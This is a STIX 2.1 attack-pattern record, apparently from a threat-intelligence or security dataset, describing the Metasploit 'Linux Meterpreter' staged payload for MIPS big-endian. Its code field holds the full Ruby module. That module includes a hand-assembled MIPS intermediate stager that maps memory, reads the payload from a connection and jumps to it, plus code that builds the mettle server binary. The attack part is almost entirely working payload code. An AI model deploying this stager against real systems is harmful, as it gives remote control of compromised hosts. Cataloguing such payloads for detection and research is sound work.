{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2bc81822-dd55-41e0-bfb0-80512f7bbfde",
    "created": "2024-08-14T16:33:19.269076Z",
    "modified": "2024-08-14T16:33:19.26908Z",
    "name": "Linux Meterpreter",
    "description": "Inject the mettle server payload (staged)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stages/linux/mipsbe/meterpreter.rb",
            "external_id": "meterpreter.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/elfparsey'\n\nmodule MetasploitModule\n  include Msf::Sessions::MeterpreterOptions\n  include Msf::Sessions::MettleConfig\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'        => 'Linux Meterpreter',\n        'Description' => 'Inject the mettle server payload (staged)',\n        'Author'      => [\n          'Adam Cammack <adam_cammack[at]rapid7.com>'\n        ],\n        'Platform'    => 'linux',\n        'Arch'        => ARCH_MIPSBE,\n        'License'     => MSF_LICENSE,\n        'Session'     => Msf::Sessions::Meterpreter_mipsbe_Linux\n      )\n    )\n  end\n\n  def elf_ep(payload)\n    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))\n    elf.elf_header.e_entry\n  end\n\n  def handle_intermediate_stage(conn, payload)\n    entry_offset = elf_ep(payload)\n    entry_h = entry_offset >> 16\n    entry_l = entry_offset & 0x0000ffff\n\n    size = payload.length\n    size_h = size >> 16\n    size_l = size & 0x0000ffff\n\n    midstager = [\n      0x00002021,                # move  a0,zero\n      (0x3c05 << 16) | size_h,   # lu    a1,SIZE[31:16]\n      (0x34a5 << 16) | size_l,   # ori   a1,a1,SIZE[15:0]\n      0x24060007,                # li    a2,7\n      0x24070802,                # li    a3,34\n      0xafa00010,                # sw    zero,16(sp)\n      0xafa00014,                # sw    zero,20(sp)\n      0x24020ffa,                # li    v0,4090\n      0x0000000c,                # syscall\n      0x00a03021,                # move  a2,a1\n      0x00402821,                # move  a1,v0\n      0x02402021,                # move  a0,s2\n      0x24070100,                # li    a3,256\n      0x2402104f,                # li    v0,4175\n      0x0000000c,                # syscall\n      0x2401fff8,                # li    at,-8\n      0x03a1e824,                # and   sp,sp,at\n      0x3c0c6d00,                # lui   t4,0x6d00\n      0x358c006d,                # ori   t4,t4,0x6d\n      0xafac002c,                # sw    t4,44(sp)\n      0x240d0002,                # li    t5,2\n      0xafad0000,                # sw    t5,0(sp)\n      0x23ae002c,                # addi  t6,sp,44\n      0xafae0004,                # sw    t6,4(sp)\n      0xafb20008,                # sw    s2,8(sp)\n      0xafa0000c,                # sw    zero,12(sp)\n      0xafa00010,                # sw    zero,16(sp)\n      0x240f0007,                # li    t7,7\n      0xafaf0014,                # sw    t7,20(sp)\n      0xafa50018,                # sw    a1,24(sp)\n      0x24180006,                # li    t8,6\n      0xafb8001c,                # sw    t8,28(sp)\n      0x24191000,                # li    t9,4096\n      0xafb90020,                # sw    t9,32(sp)\n      0xafa00024,                # sw    zero,36(sp)\n      0xafa00028,                # sw    zero,40(sp)\n      (0x3c10 << 16) | entry_h,  # lui   s0,ENTRY[31:16]\n      (0x3610 << 16) | entry_l,  # ori   s0,s0,ENTRY[15:0]\n      0x02058020,                # add   s0,s0,a1\n      0x02000008,                # jr    s0\n      0\n    ].pack('N*')\n\n    vprint_status(\"Transmitting intermediate stager...(#{midstager.length} bytes)\")\n    conn.put(midstager) == midstager.length\n  end\n\n  def generate_stage(opts = {})\n    config_opts = {scheme: 'tcp'}.merge(mettle_logging_config(opts))\n    MetasploitPayloads::Mettle.new('mips-linux-muslsf',\n      generate_config(opts.merge(config_opts))).to_binary :process_image\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}